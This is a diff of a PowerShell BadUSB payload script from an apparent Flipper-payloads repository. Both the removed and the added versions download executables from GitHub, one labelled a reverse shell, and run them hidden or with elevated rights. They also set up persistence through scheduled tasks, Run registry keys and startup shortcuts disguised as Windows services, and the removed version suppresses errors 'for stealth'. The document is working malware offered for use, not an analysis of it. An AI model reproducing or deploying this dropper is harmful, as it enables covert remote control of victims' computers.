@@ -1,94 +1,33 @@
-# =======================
-# === CONFIG SECTION ===
-# =======================
 
-# Primary Reverse Shell EXE
-$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
-$mainExePath = "$env:APPDATA\WinUman.exe"
-$mainTaskName = "Windows Update Monitor"
-$mainRunKey = "WinUman"
+# Variables
+$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinUman.exe"
+$exePath = "$env:APPDATA\WinUman.exe"
+$taskName = "WinUmanUpdater"
 
-# Secondary Payload EXE
-$altExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/MicrosoftSoundManager.exe"
-$altExePath = "$env:APPDATA\MicrosoftSoundManager.exe"
-$altTaskName = "Windows Sound Manager"
-$altRunKey = "MicrosoftSoundManager"
+# Download EXE
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# One-Time Payload
-$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
-$telemetryPath = "$env:TEMP\WinTelemetry.exe"
+# Start the EXE hidden
+Start-Process -FilePath $exePath -WindowStyle Hidden
 
-# ============================
-# === PERSISTENCE FUNCTION ===
-# ============================
+# Register scheduled task to run at logon with highest privileges
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
 
-function Add-Persistence {
-    param (
-        [string]$exePath,
-        [string]$exeUrl,
-        [string]$taskName,
-        [string]$runKeyName
-    )
+Write-Host "Setup complete. Scheduled task '$taskName' created."
+# Define variables
+$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinTelemetry.exe"
+$exePath = "$env:TEMP\WinTelemetry.exe"
 
-    try {
-        # Download EXE if missing
-        if (-not (Test-Path $exePath)) {
-            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-        }
+# Download EXE to temp folder
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-        # Start silently
-        Start-Process -FilePath $exePath -WindowStyle Hidden
+# Run the EXE with elevated privileges
+Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
 
-        # Scheduled task setup
-        $action = New-ScheduledTaskAction -Execute $exePath
-        $triggers = @(
-            New-ScheduledTaskTrigger -AtLogOn
-            New-ScheduledTaskTrigger -AtStartup
-            New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1)
-            New-ScheduledTaskTrigger -AtWorkStationUnlock
-            New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
-        )
-        $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)
+# Optional: Wait a few seconds to ensure execution
+Start-Sleep -Seconds 5
 
-        # Create scheduled task if it doesn't already exist
-        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
-            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
-        }
-
-        # Registry fallback
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runKeyName -Value $exePath
-
-        # Startup folder shortcut
-        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-        $shortcutPath = Join-Path $startupPath "$taskName.lnk"
-        $WScriptShell = New-Object -ComObject WScript.Shell
-        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = $exePath
-        $shortcut.WorkingDirectory = Split-Path $exePath
-        $shortcut.WindowStyle = 7
-        $shortcut.Save()
-    } catch {
-        # Silent failure for stealth
-    }
-}
-
-# ===========================
-# === EXECUTE PERSISTENCE ===
-# ===========================
-
-Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskName -runKeyName $mainRunKey
-Add-Persistence -exePath $altExePath -exeUrl $altExeUrl -taskName $altTaskName -runKeyName $altRunKey
-
-# ============================
-# === ONE-TIME PAYLOAD RUN ===
-# ============================
-
-try {
-    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
-    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
-    Start-Sleep -Seconds 5
-    # Optionally delete it
-    # Remove-Item -Path $telemetryPath -Force
-} catch {
-    # Silent fail
-}
+# Optional: Delete the EXE after running
+# Remove-Item -Path $exePath -Force
